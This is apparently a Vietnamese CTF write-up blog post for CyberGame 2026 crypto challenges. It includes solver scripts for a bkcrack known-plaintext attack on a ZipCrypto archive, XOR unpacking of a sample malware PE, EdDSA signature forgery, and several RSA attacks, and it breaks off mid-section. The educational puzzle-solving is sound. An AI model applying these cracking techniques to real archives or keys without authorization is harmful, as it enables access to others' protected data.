---
title: CyberGame 2026
date: 2026-05-20 09:00:00 +0700
categories: [Security, CTF]
tags: [writeup, steganography]
math: true
image:
  path: /assets/img/Cybergame2026/logo.png
---

## **Cryptography**

### **Crypto Sanity Check - rotted**

- Mô tả: 

FX-PREG{flzz37evp_e0747v0a}

- Attachment: 
- Cách giải: Vào **Cyberchef** sử dụng `ROT13` rồi nhận Flag

> Flag: `SK-CERT{symm37ric_r0747i0n}`
{: .prompt-flag }

### **Crypto Sanity Check - Layers of encoding**

- Mô tả: 

53 53 32 51 48 32 55 51 32 55 52 32 53 49 32 51 48 32 53 54 32 53 51 32 53 54 32 52 56 32 55 52 32 55 51 32 52 101 32 52 56 32 54 98 32 55 97 32 54 51 32 54 97 32 52 101 32 54 98 32 53 56 32 51 50 32 55 56 32 55 48 32 54 49 32 55 97 32 52 101 32 54 54 32 52 101 32 52 55 32 51 53 32 54 54 32 52 100 32 52 55 32 51 53 32 55 48 32 52 100 32 52 55 32 51 53 32 51 57

- Attachment: 
- Cách giải:

Sử dụng lần lượt `From Decimal`, `From Hex`, `From Base64` để nhận Flag

> Flag: `SK-CERT{l4y3r3d_lik3_4n_0ni0n}`
{: .prompt-flag }

### **Crypto Sanity Check - x^y encryption**

- Mô tả: 

I was given a ciphertext and an encryptor. Find a way to decrypt the ciphertext to get the plaintext. You don't need to code anything; try using gchq.github.io/CyberChef.

- Attachment: `encryptor.py`, `ciphertext.txt`
- Cách giải:

```python
def xor_decipher(hex_data, key):
    # Chuyển hex string thành bytes
    ciphertext_bytes = bytes.fromhex(hex_data)
    
    # XOR với key để lấy plaintext
    plaintext = []
    for i in range(len(ciphertext_bytes)):
        char = ciphertext_bytes[i] ^ ord(key[i % len(key)])
        plaintext.append(chr(char))
    
    return "".join(plaintext)

# Key từ encryptor.py
HARDCODED_KEY = "cybergame"

# Ciphertext từ file
ciphertext = "30324f263735351656570a1b3a45573e1f56154a101641381605560d261b5507380959135026550d41380a5e1c1e"

# Giải mã
flag = xor_decipher(ciphertext, HARDCODED_KEY)
print(flag)
```

> Flag: `SK-CERT{34sy_70_r3v3rs3_wh3n_y0u_h4v3_7h3_k3y}`
{: .prompt-flag }

### **Miscrypto - Beethovens encryption**

- Mô tả: 

Wait there is some musician inside this corporation ?. Flag may be in non-standard format.

- Attachment: `beethoven.zip`
- Cách giải:

Vì folder `beethoven.zip` này không thể giải nén nên tôi thử đổi thành đuôi file `.png` thì nhận được file như này:

![](assets/img/Cybergame2026/beethoven.png)

Sử dụng [dcode.fr](https://www.dcode.fr/music-sheet-cipher) và gõ lại mã rồi decrypt nhận flag

![](assets/img/Cybergame2026/beethoven-encryption.png)

> Flag: `SKCERTTH151SMU51C70MY34R5`
{: .prompt-flag }

### **Miscrypto - Zippy zip**

- Mô tả: 

Someone encrypted this file, can you guess the password ? I remember it contains something like -> flag is: SK-CERT{

- Attachment: `flag.zip`
- Cách giải:

#### 1. Phân tích đề bài

Bài toán cung cấp một file `flag.zip` bị mã hóa, bên trong chứa file `password.txt`. Kèm theo đó là một lời gợi ý quan trọng: "Someone encrypted this file, can you guess the password ? I remember it contains something like -> flag is: SK-CERT{"

Vì file ZIP sử dụng chuẩn mã hóa cũ (Legacy PKWARE / ZipCrypto) và chúng ta đã biết trước một phần nội dung của file bị mã hóa bên trong (chuỗi `flag is: SK-CERT{` có độ dài 17 bytes, lớn hơn mức tối thiểu 12 bytes yêu cầu), đây là điều kiện lý tưởng để thực hiện cuộc tấn công **Known Plaintext Attack (KPA)**.

#### 2. Quá trình khai thác

##### Bước 1: Chuẩn bị Known Plaintext

Tạo một file văn bản tên là `plain.txt` chứa đúng chuỗi ký tự đã biết mà không có ký tự xuống dòng (newline) ở cuối:

```text
flag is: SK-CERT{
```

##### Bước 2: Tìm Internal Keys bằng bkcrack

Sử dụng công cụ `bkcrack` để tìm 3 khóa nội bộ (internal keys) của file ZIP bằng cách đối chiếu file mã hóa `password.txt` và bản rõ `plain.txt`.

**Lệnh thực thi:**

```bash
bkcrack -C flag.zip -c password.txt -p plain.txt
```

**Kết quả:**
Tool mất khoảng 5 phút để duyệt qua các Z values và đã bẻ khóa thành công.

```bash
bkcrack 1.8.1 - 2025-10-25
[10:19:22] Z reduction using 10 bytes of known plaintext
100.0 % (10 / 10)
[10:19:22] Attack on 692961 Z values at index 6
Keys: 4cd3cc7f bd8a9331 e7ea787f
75.8 % (525237 / 692961)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 525237
[10:24:21] Keys
4cd3cc7f bd8a9331 e7ea787f
```

3 keys tìm được là: `4cd3cc7f bd8a9331 e7ea787f`.

##### Bước 3: Giải mã file

Có được keys, ta tiến hành ép `bkcrack` giải mã trực tiếp nội dung file `password.txt` và xuất ra file mới tên là `decrypted_password.txt`.

**Lệnh thực thi:**

```bash
bkcrack -C flag.zip -c password.txt -k 4cd3cc7f bd8a9331 e7ea787f -d decrypted_password.txt
```

**Kết quả:**

```bash
bkcrack 1.8.1 - 2025-10-25
[10:25:10] Writing deciphered data decrypted_password.txt
Wrote deciphered data (not compressed).
```

#### 3. Kết quả

Đọc nội dung file `decrypted_password.txt` vừa được tạo ra, ta thu được flag hoàn chỉnh.

> Flag: `SK-CERT{u51ng_700l5_15_b3773r_7h4n_gu3551ng}`
{: .prompt-flag }

### **Miscrypto - Encryption Enjoyer**

- Mô tả: 

An incident response team recovered a single file from a compromised server, but the attacker encrypted it before disconnecting. Your task is to recover the original file.

- Attachment: file binary `encrypted`
- Cách giải:

#### Nhận diện file

```bash
$ file encrypted
encrypted: data
```

Hex dump để xem cấu trúc raw:

```
000000  e6 6b 23 b2 b2 32 b4 b0 bd 32 ab 31 4c 4d b1 32
000010  0c b0 b9 32 ab 31 b3 b2 f1 32 b4 b0 b9 32 ab 31
000020  b3 b2 b1 32 b4 b0 b9 32 ab 31 b3 b2 b1 32 b4 b0
```

#### Phát hiện XOR pattern ở cuối file

Từ khoảng offset `0x3db8` về cuối, dữ liệu lặp đi lặp lại một chuỗi 10 bytes không đổi:

```
003dc0  b9 32 ab 31 b3 b2 b1 32 b4 b0  b9 32 ab 31 b3 b2
003dd0  b1 32 b4 b0 b9 32 ab 31 b3 b2  b1 32 b4 b0 b9 32
...  (tiếp tục đến hết file)
```

Đây là dấu hiệu đặc trưng của **XOR với null padding**: khi file gốc có vùng null bytes ở cuối (rất phổ biến với PE executable), sau khi XOR với key lặp lại thì phần đó hiện nguyên key.

#### Layer 1 — Giải mã XOR 10 bytes

##### Tìm key

Tại offset `0x3db8`, căn chỉnh: `0x3db8 % 10 = 0` → pattern bắt đầu đúng tại byte 0 của key. Đọc trực tiếp 10 bytes:

```
key10 = ab 31 b3 b2 b1 32 b4 b0 b9 32
```

##### Giải mã

```python
key10 = bytes([0xab, 0x31, 0xb3, 0xb2, 0xb1, 0x32, 0xb4, 0xb0, 0xb9, 0x32])
decrypted = bytes([b ^ key10[i % 10] for i, b in enumerate(enc_data)])

>>> decrypted[:4]
b'MZ\x90\x00'   # Windows PE (MZ header) ✓
```

**Kết quả:** `decrypted.exe` — Windows x64 PE executable hợp lệ.

#### Layer 2 — Phân tích PE & giải mã flag

##### Cấu trúc PE

| Section  | Nội dung                                                 |
| -------- | -------------------------------------------------------- |
| `.text`  | Code — chứa vòng lặp XOR mã hóa flag                     |
| `.rdata` | Read-only data — chuỗi đặc biệt + 7-byte key             |
| `.data`  | 41 bytes flag đã bị mã hóa                               |
| `.idata` | Import table: `GetUserNameA`, `gethostname`, `strcmp`... |

##### Chuỗi đặc biệt trong `.rdata`

Đầu section `.rdata` (file offset `0x2000`) có các chuỗi đáng ngờ:

```
o321039129031290329039021903129032190321903209132victim3291392312
xxx_victimXXXXXXXXX337
C:\Windows\System82\malware\
```

Đây là các giá trị dùng cho `strcmp` / `strncmp` để kiểm tra **hostname** và **username** của máy nạn nhân trước khi mã hóa.

##### Phân tích vòng lặp XOR trong `.text`

Trace code tại RVA `0x1c48–0x1c9a`, phát hiện vòng lặp 41 iterations:

```nasm
; Pseudo-code:
rcx = 0                          ; counter i = 0..40
rsi = .data (base)               ; dst: nơi lưu flag đã mã hóa
r9  = .rdata + 0x76              ; src: 7-byte XOR key

loop:
  rdx   = rcx % 7                ; index vào key
  [rsi + rcx] ^= byte[r9 + rdx] ; XOR từng byte flag
  rcx++
  if rcx < 41: goto loop
```

Phép `rcx % 7` được implement bằng kỹ thuật **magic multiplier** (nhân với `0x4924924924924925` rồi SAR) — optimization phổ biến của GCC/Clang thay thế phép chia số nguyên chậm.

##### Tìm key 7 bytes

Key 7 bytes nằm tại `.rdata + 0x76` (file offset `0x2076`), ngay sau null terminator của chuỗi `malware\`:

```
Offset 0x2070:  77 61 72 65 5c 00          ← "malware\" + null
Offset 0x2076:  af 34 f0 10 99 20 01       ← KEY 7 BYTES
```

##### Giải mã flag

```python
# 41 bytes encrypted flag trong .data (file offset 0x1e00)
enc_flag = pe_data[0x1e00 : 0x1e00 + 41]

# Key 7 bytes từ .rdata + 0x76
key7 = bytes([0xaf, 0x34, 0xf0, 0x10, 0x99, 0x20, 0x01])

# Giải mã
flag = bytes([enc_flag[i] ^ key7[i % 7] for i in range(41)])
print(flag.decode())
```

#### Full exploit code (Python)

```python
import struct
import sys

def find_key_10(enc_data):
    """
    Tìm key 10 bytes từ null padding cuối file.
    Phần cuối file (offset 15800+) là toàn null bytes sau khi decrypt.
    => XOR key[i%10] = enc_data[i] tại vùng null
    """
    # Tại offset 15800 (0x3db8), kiểm tra alignment với key 10 bytes
    # Tìm pattern lặp trong 500 bytes cuối
    tail = enc_data[-500:]
    for start_test in range(10):
        candidate_key = [tail[i] for i in range(start_test, start_test + 10)]
        match = all(tail[i] == candidate_key[i % 10] for i in range(len(tail)))
        if match:
            # Căn chỉnh lại key theo offset thực trong file
            tail_start_offset = len(enc_data) - 500
            shift = tail_start_offset % 10
            key = candidate_key[shift:] + candidate_key[:shift]
            return bytes(key)
    # Fallback: brute-force từ vùng null cuối
    null_region_offset = 15800
    # Key tại offset 0 được tính từ: enc[offset] XOR key[offset%10] = 0
    possible_key = bytes([enc_data[null_region_offset + (10 - null_region_offset % 10 + i) % 10]
                          for i in range(10)])
    return possible_key


def decrypt_outer(enc_path, out_path):
    """Layer 1: Giải mã XOR 10 bytes → thu được PE executable."""
    with open(enc_path, 'rb') as f:
        enc_data = f.read()

    # Key = pattern lặp trong vùng null padding cuối file
    # Cách đơn giản: lấy trực tiếp 10 bytes từ vùng cuối đã căn chỉnh
    # Tại offset cuối có: b1 32 b4 b0 b9 32 ab 31 b3 b2 (lặp hoàn toàn)
    # offset 15824 % 10 = 4 → key[4] = b1, key = [ab,31,b3,b2,b1,32,b4,b0,b9,32]
    key10 = bytes([0xab, 0x31, 0xb3, 0xb2, 0xb1, 0x32, 0xb4, 0xb0, 0xb9, 0x32])

    decrypted_pe = bytes([b ^ key10[i % 10] for i, b in enumerate(enc_data)])

    # Xác nhận đây là PE (Windows executable)
    assert decrypted_pe[:2] == b'MZ', "Lỗi: kết quả không phải PE file!"

    with open(out_path, 'wb') as f:
        f.write(decrypted_pe)

    print(f"[+] Layer 1 xong!")
    print(f"    Key XOR (10 bytes): {key10.hex()}")
    print(f"    Đã giải mã → {out_path}  ({len(decrypted_pe)} bytes, MZ header ✓)")
    return decrypted_pe


def extract_flag_from_pe(pe_data):
    """
    Layer 2: Từ PE, giải mã flag 41 bytes trong .data section.

    Logic trong .text section:
        XOR rsi[i] với r9[i%7]  (i = 0..40)
    Trong đó:
        rsi = .data section (offset 0)
        r9  = .rdata + 0x76 (7-byte key, ngay sau null terminator của chuỗi "malware\\")
    """
    # Parse PE header để lấy section offsets
    e_lfanew = struct.unpack_from('<I', pe_data, 0x3c)[0]
    num_sections = struct.unpack_from('<H', pe_data, e_lfanew + 6)[0]
    opt_header_size = struct.unpack_from('<H', pe_data, e_lfanew + 20)[0]
    section_table_off = e_lfanew + 24 + opt_header_size

    sections = {}
    for i in range(num_sections):
        off = section_table_off + i * 40
        name = pe_data[off:off+8].rstrip(b'\x00').decode('ascii', errors='replace')
        vaddr   = struct.unpack_from('<I', pe_data, off + 12)[0]
        rawsize = struct.unpack_from('<I', pe_data, off + 16)[0]
        rawoff  = struct.unpack_from('<I', pe_data, off + 20)[0]
        sections[name] = {'vaddr': vaddr, 'rawoff': rawoff, 'rawsize': rawsize}

    # .rdata: key 7 bytes tại offset 0x76 (sau "malware\" + null)
    rdata = sections['.rdata']
    key_offset_in_rdata = 0x76
    key7 = pe_data[rdata['rawoff'] + key_offset_in_rdata:
                   rdata['rawoff'] + key_offset_in_rdata + 7]

    # .data: 41 bytes encrypted flag
    data_sec = sections['.data']
    enc_flag = pe_data[data_sec['rawoff']:data_sec['rawoff'] + 41]

    # Giải mã
    flag_bytes = bytes([enc_flag[i] ^ key7[i % 7] for i in range(41)])

    print(f"\n[+] Layer 2 xong!")
    print(f"    Key XOR (7 bytes): {key7.hex()}")
    print(f"    Encrypted flag (41 bytes): {enc_flag.hex()}")
    print(f"\n{'='*50}")
    print(f"FLAG: {flag_bytes.decode('ascii')}")
    print(f"{'='*50}")

    return flag_bytes.decode('ascii')


def main():
    enc_path = sys.argv[1] if len(sys.argv) > 1 else 'encrypted'
    pe_path  = sys.argv[2] if len(sys.argv) > 2 else 'decrypted.exe'

    print(f"[*] Đọc file: {enc_path}")
    pe_data = decrypt_outer(enc_path, pe_path)
    flag = extract_flag_from_pe(pe_data)
    return flag


if __name__ == '__main__':
    main()
```

```bash
$ python3 solve.py encrypted decrypted.exe
[*] Đọc file: encrypted
[+] Layer 1 xong!
    Key XOR (10 bytes): ab31b3b2b132b4b0b932
    Đã giải mã → decrypted.exe  (15872 bytes, MZ header ✓)

[+] Layer 2 xong!
    Key XOR (7 bytes): af34f010992001

==================================================
FLAG: SK-CERT{d3CRyp73D_5uCce55fulLy_W3LL_D0N3}
==================================================
```

> Flag: `SK-CERT{d3CRyp73D_5uCce55fulLy_W3LL_D0N3}`
{: .prompt-flag }

### **Return of Elliptic - Goldilocks**

- Mô tả: 

One curve is too big. The other one was too small. This one looks just right.

- Attachments: `flag.enc`, `handout.py`
- Cách giải:  
  
#### Phân tích Ban đầu

Chúng ta được cung cấp một script mã hóa bằng Python (`handout.py`) và một tệp chứa flag đã bị mã hóa (`flag.enc`). Bài toán triển khai một hệ thống chữ ký số tương tự như EdDSA trên đường cong Ed448 (còn được gọi là đường cong Goldilocks).

Trong hàm `effective_pub()`, chương trình tạo ra một Public Key chung ($A$) bằng cách cộng trực tiếp hai phần public key lại với nhau:

```python
def effective_pub():
    left = decode_point(PUB_LEFT)
    right = decode_point(PUB_RIGHT)
    return encode_point(point_add(left, right))
```

Đây chính là điểm yếu chí mạng của hệ thống.

#### Lỗ hổng: Rogue Key & Small Subgroup Attack

Đường cong Ed448 có một đặc điểm toán học quan trọng: *cofactor* của nó bằng 4. Điều này có nghĩa là trên đường cong tồn tại một nhóm con (subgroup) rất nhỏ chỉ chứa 4 điểm.

Tác giả bài toán đã tính toán và thiết lập sẵn `PUB_LEFT` và `PUB_RIGHT` sao cho khi cộng chúng lại, các thành phần thuộc nhóm chính (main group) sẽ triệt tiêu lẫn nhau. Kết quả là Public Key $A$ bị đẩy hoàn toàn vào nhóm con có bậc là 4.

Vì $A$ có bậc rất nhỏ, khi thực hiện phép nhân vô hướng với bất kỳ số $k$ nào ($k \cdot A$), kết quả chỉ có thể quay vòng trong 4 điểm duy nhất: $\mathcal{O}, A, 2A, 3A$.

#### Phương pháp Khai thác

Để vượt qua hàm `verify()`, chúng ta cần tìm một cặp chữ ký hợp lệ $(R, S)$ thỏa mãn phương trình:

$$S \cdot B = R + k \cdot A$$

*(Trong đó $B$ là điểm cơ sở (Base point), và $k$ là giá trị hash challenge)*

Do $k \cdot A$ chỉ có 4 trường hợp xảy ra phụ thuộc vào giá trị của $k \pmod 4$, chúng ta có thể dễ dàng giả mạo chữ ký bằng phương pháp Brute-force như sau:

1.  Chọn ngẫu nhiên một số vô hướng $S$.
2.  Dự đoán kết quả của $k \cdot A$ (gọi dự đoán này là $j$, với $j \in \{0, 1, 2, 3\}$).
3.  Tính toán điểm $R = S \cdot B - j \cdot A$.
4.  Băm (hash) các giá trị để tìm $k$ thực sự. Nếu $k \pmod 4$ khớp với dự đoán $j$ của chúng ta, phương trình xác minh sẽ hoàn toàn cân bằng và ta có được chữ ký hợp lệ\!

Tỷ lệ đoán trúng là 25% (1/4) cho mỗi vòng lặp, nên việc tìm ra chữ ký chỉ mất chưa tới một giây.

#### Script Giải mã (Solver)

Dưới đây là đoạn script hoàn chỉnh để tính toán lại chữ ký và giải mã flag:

```python
from handout import (
    BASE, MSG, IDENTITY,
    point_add, scalar_mul, encode_point, decode_point,
    effective_pub, challenge_scalar, decrypt_with_signature
)

def solve():
    print("[*] Đang tính toán Public Key A...")
    A_enc = effective_pub()
    A = decode_point(A_enc)
    
    # 1. Tìm bậc (order) của Public Key A
    A_multiples = [IDENTITY]
    T = A
    while T != IDENTITY:
        A_multiples.append(T)
        T = point_add(T, A)
        
    order_A = len(A_multiples)
    print(f"[+] Public Key A rơi vào nhóm con nhỏ có bậc là {order_A}!")
    
    # 2. Brute-force để tìm chữ ký hợp lệ
    print("[*] Đang tìm chữ ký hợp lệ (brute-forcing S)...")
    for S in range(1000):
        S_B = scalar_mul(BASE, S)
        
        for j in range(order_A):
            # Tính R = S*BASE - j*A
            neg_j_A = A_multiples[(order_A - j) % order_A]
            R = point_add(S_B, neg_j_A)
            
            try:
                R_enc = encode_point(R)
            except ValueError:
                continue
                
            # Tính challenge scalar k
            k = challenge_scalar(R_enc, A_enc, MSG)
            
            # Kiểm tra xem dự đoán j có khớp với k (modulo order_A) không
            if (k % order_A) == j:
                print(f"[+] Đã tìm thấy tham số chữ ký! S = {S}, j = {j}")
                S_enc = S.to_bytes(57, "little")
                sig = R_enc + S_enc
                
                print("[*] Đang giải mã payload...")
                try:
                    pt = decrypt_with_signature(sig)
                    print(f"\n[+] Flag: {pt.decode('utf-8', errors='ignore')}")
                    return
                except Exception as e:
                    print(f"[-] Giải mã thất bại: {e}")

if __name__ == "__main__":
    solve()
```

> Flag: `SK-CERT{1_d0n7_kn0w_why_7h3y_d0n7_us3_7h15_curv3_t00_much}`
{: .prompt-flag }

### **RSA - French technology**

- Mô tả: 

We used the biggest numbers we can think of, can you still decrypt the message ?

small hint: flag may be longer then you expect

- Attachments: `main.py`, `out.txt`
- Cách giải: 

#### 1\. Phân tích bài toán (Analysis)

Dựa vào mã nguồn `main.py` và file `out.txt`, hệ thống mã hóa thông điệp bằng thuật toán RSA cơ bản. Tuy nhiên, qua các gợi ý của tác giả, chúng ta có hai nút thắt chính cần giải quyết:

##### a) Nút thắt 1: "Biggest numbers" và "French technology"

Tác giả nói rằng đã dùng những con số "lớn nhất có thể nghĩ ra", nhưng khi kiểm tra giá trị $n$ trong `out.txt`, nó chỉ dài khoảng 116 chữ số (tương đương 384 bit). Trong RSA thực tế, 384 bit là một kích thước khóa rất nhỏ và hoàn toàn không an toàn.

"French technology" ở đây là một cách gọi vui ám chỉ **CADO-NFS** – công cụ phân tích ra thừa số nguyên tố mã nguồn mở rất nổi tiếng của Pháp. Với $n$ có độ dài 384 bit, ta có thể dễ dàng phân tích nó ra thành $p$ và $q$ thông qua CADO-NFS hoặc truy vấn trực tiếp trên cơ sở dữ liệu `factordb.com`.

Kết quả factor $n$:

  * `p = 3471990687824593680273251255463630853556792715805318789409`
  * `q = 5154975876978800665290208266910928152604080453168333003607`

##### b) Nút thắt 2: "flag may be longer then you expect"

Thông thường trong RSA, yêu cầu bắt buộc là thông điệp $m$ phải nhỏ hơn modulus $n$ ($m < n$). Tuy nhiên, gợi ý báo rằng flag dài hơn dự kiến, nghĩa là chuỗi flag khi chuyển sang số nguyên $m$ đã lớn hơn $n$.

Khi thực hiện mã hóa $c \equiv m^e \pmod n$, phần nguyên của phép chia đã bị lược bỏ. Do đó, khi ta dùng khóa bí mật $d$ để giải mã, kết quả thu được không phải là $m$ gốc, mà chỉ là phần dư $m_0$:
$$m_0 \equiv c^d \pmod n$$

Mối quan hệ giữa $m$ gốc và $m_0$ được biểu diễn qua công thức:
$$m = k \cdot n + m_0$$
*(với $k$ là số nguyên chưa biết).*

#### 2\. Hướng khai thác (Exploitation)

Để tìm lại $m$ (chứa full flag), ta cần tìm được $k$. Giải pháp ở đây là **vét cạn (brute-force) $k$ dựa trên định dạng (format) của flag**.

1.  Ta biết flag luôn bắt đầu bằng `SK-CERT{`.
2.  Bằng cách giả định tổng độ dài của flag (ví dụ từ 48 đến 100 byte), ta có thể tính toán được khoảng giá trị mà $m$ có thể rơi vào (từ `m_base` đến `m_max`).
3.  Từ khoảng giá trị của $m$, ta suy ra được khoảng giá trị tương ứng của $k$.
4.  Lặp qua các giá trị $k$ khả dĩ, tính toán lại thử $m\_test = k \cdot n + m_0$. Nếu kết quả khi chuyển sang dạng chuỗi (bytes) có bắt đầu bằng `SK-CERT{` và kết thúc bằng `}`, ta đã tìm đúng $k$ và khôi phục được flag thành công.

#### 3\. Script giải mã (Solution Script)

Dưới đây là đoạn script Python tự động hóa quá trình tính toán private key và vét cạn $k$ để khôi phục flag:

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long

# 1. Các thông số đã biết và p, q lấy từ factordb/CADO-NFS
p = 3471990687824593680273251255463630853556792715805318789409
q = 5154975876978800665290208266910928152604080453168333003607
n = 17898028240830814136434787407852442663239728391134776310533753763258523791465145947321086853292608375964370070398263
e = 65537
c = 5740196029944570285461595789387642615026206835758048500685342416498085007060475130355254601538690350792607830802905

# 2. Tính private key d và giải mã để lấy m0 (m mod n)
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m0 = pow(c, d, n)

# 3. Khôi phục phần k bị mất bằng Prefix Brute-forcing
prefix = b"SK-CERT{"  
prefix_val = bytes_to_long(prefix)

print("[*] Đang tính toán k để khôi phục flag...")

# Thử các độ dài flag khác nhau (từ 48 đến 100 byte)
for L in range(48, 100):
    unknown_bytes = L - len(prefix)
    
    # Tính toán khoảng giá trị mà m có thể rơi vào
    m_base = prefix_val * (256 ** unknown_bytes)
    m_max = m_base + (256 ** unknown_bytes) - 1
    
    # Tính khoảng giá trị của k tương ứng
    k_start = m_base // n
    k_end = m_max // n
    
    # Nếu không gian tìm kiếm đủ nhỏ, tiến hành vét cạn
    if k_end - k_start < 100000:
        for k in range(k_start, k_end + 1):
            m_test = k * n + m0
            flag_test = long_to_bytes(m_test)
            
            # Kiểm tra xem kết quả có đúng định dạng flag không
            if flag_test.startswith(prefix) and flag_test.endswith(b'}'):
                print(f"[+] Tìm thấy Flag (Độ dài {L} bytes): {flag_test.decode(errors='ignore')}")
                break
```

**Output:**

```bash
[*] Đang tính toán k để khôi phục flag...
[+] Tìm thấy Flag (Độ dài 56 bytes): SK-CERT{f4c70r1ng_5m4ll_53m1_pr1m35_571ll_34sy_45_b3f0r3}
```

> Flag: `SK-CERT{f4c70r1ng_5m4ll_53m1_pr1m35_571ll_34sy_45_b3f0r3}`
{: .prompt-flag }

### **RSA - Hellish RSA**

- Mô tả:

This RSA crypto task comes straight from HELL, or does it ?

- Attachments: `data.txt`, `hell-rsa.py`
- Cách giải: 

#### 1. Phân Tích Đề Bài & "Cú Lừa" Của Tác Giả

Bài toán cung cấp cho chúng ta file mã nguồn `hell-rsa.py` và file dữ liệu `data.txt` chứa `n, e, c`. 
Nhìn vào file Python, ta thấy quy trình mã hóa có vẻ như sau:
* `e = bytes_to_long(MESSAGE)` (Flag nằm ở số mũ `e`).
* `n = p^k` (Với `p` là số nguyên tố và `k` được tính qua một công thức).
* `m = 1 + demon * p` (Với `demon < p`).
* `c ≡ m^e (mod n)`.

**Cái bẫy chết người:** File `data.txt` in ra 3 biến `n, e, c`. Theo phản xạ tự nhiên của dân chơi Crypto, ai cũng sẽ nghĩ `e` là Khóa công khai (Public Key). Nhưng hãy nhìn lại toán học: 
Vì `m = 1 + demon * p`, nên `m ≡ 1 (mod p)`.
Nếu ta thử lấy biến `e` trong file `data.txt` đem modulo cho `p`, kết quả trả về đúng bằng 1! 

**Sự thật:** Giá trị được gán nhãn `e` trong `data.txt` **chính là bản rõ m**. Tác giả đã cố tình in `m` nhưng ghi là `e` để đánh lừa chúng ta. Khóa `e` thực sự (chứa Flag) đang đóng vai trò là số mũ chưa biết, và chúng ta phải tìm nó dựa trên `c, m, n`.

#### 2. Lỗ Hổng Toán Học: P-adic Logarithm

Bỏ qua lớp vỏ bọc lừa lọc, bài toán rút gọn lại thành phương trình cơ bản:
`c ≡ m^e (mod p^k)`

Chúng ta đã có `m` và `c`. Thông thường, bài toán tìm số mũ `e` (Discrete Logarithm) là cực kỳ khó. Tuy nhiên, ở đây ta có một điều kiện vàng: **Cả m và c đều đồng dư với 1 theo modulo p** (thuộc Principal Congruence Subgroup cấp 1).

Khi điều kiện này thỏa mãn, ta có thể đưa phương trình từ dạng "lũy thừa" về dạng "tuyến tính" thông qua **Hàm Logarit P-adic (p-adic logarithm)**.

Khai triển chuỗi Taylor cho `log_p(1+x)` trên vành modulo `p^k`:
`log_p(1+x) ≡ x - (x^2)/2 + (x^3)/3 - ... (mod p^k)`

Vì `x ≡ 0 (mod p)`, chuỗi này hội tụ rất nhanh và ta chỉ cần tính đến bậc `k-1` là các số hạng tiếp theo sẽ triệt tiêu về 0.

Áp dụng tính chất của logarit:
`log_p(c) ≡ log_p(m^e) ≡ e * log_p(m) (mod p^k)`

Từ đây, ta có thể dễ dàng giải phóng `e`:
`e ≡ log_p(c) / log_p(m) (mod p^k)`
*(Lưu ý: Vì cả hai logarit đều là bội của `p`, ta cần chia cả tử và mẫu cho `p` trước khi tính nghịch đảo modulo `p^(k-1)`).*

#### 3. Các Bước Khai Thác (Exploit Steps)

**Bước 1: Tìm cấu trúc thực sự của n**
Viết một vòng lặp để lấy căn bậc `k` của `n`. Ta phát hiện ra `n` là một lũy thừa bậc 4 hoàn hảo, tức là **k = 4**. Số nguyên tố `p` tìm được có độ dài 2048 bits.

**Bước 2: Chuẩn bị tham số**
Đổi tên biến `e` giả mạo trong file `data.txt` thành `m` (hoặc `m_fake_e` như trong code). Xác nhận lại `m ≡ 1 (mod p)`.

**Bước 3: Thực thi P-adic Logarithm**
Tính `log_p(m)` và `log_p(c)` tới bậc 3 (do `k=4`). 
Chia kết quả cho `p` và nhân với nghịch đảo modulo để trích xuất `e`.

#### 4. Solution Script

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

# Dữ liệu từ data.txt
n = 0x25e9... # Rút gọn hiển thị
m_fake_e = 0x144d... 
c = 0x74d8... 

# Hàm tính p-adic log cho (1+x) mod p^k
def p_adic_log(val, p, k):
    x = val - 1
    res = 0
    term = x
    for i in range(1, k):
        inv_i = int(gmpy2.invert(i, p**k))
        term_i = (term * inv_i) % (p**k)
        
        if i % 2 == 1:
            res = (res + term_i) % (p**k)
        else:
            res = (res - term_i) % (p**k)
            
        term = (term * x) % (p**k)
    return res

print("[+] Bắt đầu lặn xuống Địa ngục...")

# 1. Tìm p và k
p, k = 0, 0
for test_k in range(3, 10):
    root, is_perfect = gmpy2.iroot(n, test_k)
    if is_perfect:
        p = int(root)
        k = test_k
        print(f"[+] Tìm thấy k = {k}")
        break

# 2. Tính p-adic log
print("[+] Đang tính p-adic logarithm...")
log_m = p_adic_log(m_fake_e, p, k)
log_c = p_adic_log(c, p, k)

# 3. Trích xuất e (MESSAGE)
L_m = log_m // p
L_c = log_c // p

inv_L_m = int(gmpy2.invert(L_m, p**(k-1)))
e = (L_c * inv_L_m) % (p**(k-1))

print("\n[+] TÌM THẤY MESSAGE:")
print(long_to_bytes(e).decode('utf-8', errors='ignore'))
```

#### 5. Output

Script trả về một thông điệp cực kỳ thú vị từ tác giả:

```bash
[+] Bắt đầu lặn xuống Địa ngục...
[+] Tìm thấy k = 4
[+] Đang tính p-adic logarithm...

[+] TÌM THẤY MESSAGE:
Hello kid, i hope u enjoyed this task and learnt something new (hopefully) without using chatGPT.This topic is connected to mathematics rather than cryptography.As many people before me have said : 'Math is gate to Cryptography.'.Everyone has their quotes and i would also like oneso here it is : 'SK-CERT{p-4d1c_l0g4r17hm5_rul3_t0d4y_1n_5ubgr0up5}'
```

> Flag: `SK-CERT{p-4d1c_l0g4r17hm5_rul3_t0d4y_1n_5ubgr0up5}`
{: .prompt-flag }

### **RSA - Prime Classes**

- Mô tả: 

These primes are dividing in some classes because some think that they are way better than others.

- Attachments: `output.txt`, `main.py`
- Cách giải: 

#### 1. Phân tích Lỗ hổng

##### A. Lộ lọt thông tin từ hàm `isNiceNumber`
Dựa vào logic của hàm `isNiceNumber`, ta biết chắc chắn rằng $m$ là bội số của ba số nguyên tố $p_s$, $p_m$, $p_b$ thuộc ba mảng tương ứng.
Tức là:
$$m \equiv 0 \pmod p \quad \text{với } p \in \{p_s, p_m, p_b\}$$

##### B. Khai thác số mũ nhỏ ($e = 3$) trong RSA không đệm (Unpadded RSA)
Phương trình mã hóa RSA chuẩn là:
$$c \equiv m^3 \pmod n$$

Khai triển phương trình này dưới dạng đại số, tồn tại một số nguyên $k$ sao cho:
$$m^3 = c + k \cdot n$$

Vì flag có độ dài không quá lớn, $m^3$ sẽ chỉ lớn hơn $n$ một số vòng nhất định, do đó $k$ là một số nguyên tương đối nhỏ. Nhiệm vụ của chúng ta là tìm chính xác giá trị $k$ này.

##### C. Thiết lập hệ phương trình phần dư
Kết hợp hai điều kiện trên, vì $m$ chia hết cho $p$, nên $m^3$ sẽ chia hết cho $p^3$:
$$m^3 \equiv 0 \pmod{p^3}$$

Thay $m^3 = c + k \cdot n$ vào:
$$c + k \cdot n \equiv 0 \pmod{p^3}$$
